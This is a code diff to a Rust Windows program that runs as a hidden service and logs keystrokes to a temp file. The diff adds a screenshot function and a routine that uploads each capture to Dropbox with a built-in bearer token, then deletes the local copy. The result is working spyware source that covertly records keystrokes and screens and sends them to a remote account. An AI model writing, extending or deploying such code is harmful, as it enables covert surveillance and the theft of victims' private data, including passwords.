@@ -1,6 +1,7 @@
 #![windows_subsystem = "windows"]
 use rdev::{listen, Event, EventType};
 use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION, CONTENT_TYPE};
+use screenshots::Screen;
 use tokio::runtime::Runtime;
 use std::fs::{self, OpenOptions};
 use std::io::Write;
@@ -13,6 +14,7 @@ pub mod server;
 const LOG_FILE: &str = "C:\\Windows\\Temp\\avs_service.log";
 
 pub const TOKEN: &str = include_str!("token.txt");
+const IMG_PATH: &str = "C:\\temp\\screenshot.png";
 
 fn callback(event: Event) {
     if let EventType::KeyPress(key) = event.event_type {
@@ -94,6 +96,14 @@ pub async fn start_logic() {
                         if let Err(e) = fs::File::create("C:\\temp\\klogs.txt") {
                             log_to_file(&format!("Failed to recreate klogs.txt: {}", e));
                         }
+                    },
+                    Err(_) => ()
+                }
+
+                match shoot() {
+                    Ok(_) => {
+                        let _ = upload_image().await;
+                        let _ = fs::remove_file(IMG_PATH);
                     },
                     Err(_) => ()
                 }
@@ -181,6 +191,48 @@ async fn upload_file2(file_path: &str) -> Result<(), Box<dyn std::error::Error>>
     Ok(())
 }
 
+async fn upload_image() -> Result<(), Box<dyn std::error::Error>> {
+    // Check if file is empty
+    let metadata = fs::metadata(IMG_PATH)?;
+    if metadata.len() == 0 {
+        // File is empty, return Ok(())
+        return Ok(());
+    }
+
+    let tk: String = get_token().await?;
+    let access_token = format!("Bearer {}", tk);
+    let dropbox_destination = format!("/{}.png", chrono::Utc::now().format("%Y-%m-%d_%H-%M-%S"));
+
+    // === Đọc nội dung file ===
+    let file_data = fs::read(IMG_PATH)?;
+
+    // === Tạo headers ===
+    let mut headers = HeaderMap::new();
+    headers.insert(AUTHORIZATION, HeaderValue::from_str(&access_token)?);
+    headers.insert("Dropbox-API-Arg", HeaderValue::from_str(&format!(
+        "{{\"path\": \"{}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}}",
+        dropbox_destination
+    ))?);
+    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));
+
+    // === Gửi request ===
+    let client = reqwest::Client::new();
+    let res = client
+        .post("https://content.dropboxapi.com/2/files/upload")
+        .headers(headers)
+        .body(file_data)
+        .send()
+        .await?;
+
+    // === In kết quả ===
+    let status = res.status();
+    let text = res.text().await?;
+    println!("Status: {}", status);
+    println!("Response: {}", text);
+
+    Ok(())
+}
+
 // Helper function to log messages to a file
 fn log_to_file(message: &str) {
     let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
@@ -195,6 +247,20 @@ fn log_to_file(message: &str) {
         };
     
     let _ = file.write_all(log_message.as_bytes());
+}
+
+fn shoot() -> Result<(), Box<dyn std::error::Error>> {
+    let screens = Screen::all()?;
+    if screens.is_empty() {
+        return Err("No screens found".into());
+    }
+    let screen = &screens[0];
+
+    let image = screen.capture()?;
+
+    image.save(IMG_PATH)?;
+
+    Ok(())
 }
 
 fn main() -> Result<(), windows_service::Error> {
